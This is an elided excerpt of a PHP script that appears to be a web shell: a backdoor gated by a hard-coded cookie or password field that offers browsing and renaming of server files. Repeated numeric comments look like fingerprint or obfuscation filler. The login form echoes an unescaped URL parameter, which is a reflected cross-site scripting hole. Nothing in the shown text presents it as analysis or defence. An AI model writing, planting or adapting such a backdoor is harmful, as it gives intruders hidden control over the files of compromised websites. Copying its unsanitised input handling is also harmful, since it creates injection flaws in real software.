...
$pass = false;
if (isset($_COOKIE['pw_name_97984'])) {
    if(($_COOKIE['pw_name_97984']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_97984'])) {
        if(($_POST['pw_name_97984']) == $auth_key) {
            setcookie("pw_name_97984", $_POST['pw_name_97984']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_97984' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1705526307308955 1705526307704254 1705526307602748 1705526307677751
echo <<<HEAD
<!DOCTYPE html>
<html lang="en">
<head>
...
HEAD;// 1705526307308955 1705526307704254 1705526307602748 1705526307677751
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1705526307308955 1705526307704254 1705526307602748 1705526307677751
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1705526307308955 1705526307704254 1705526307602748 1705526307677751
            $name = PATH . "/" . $_GET['r'];
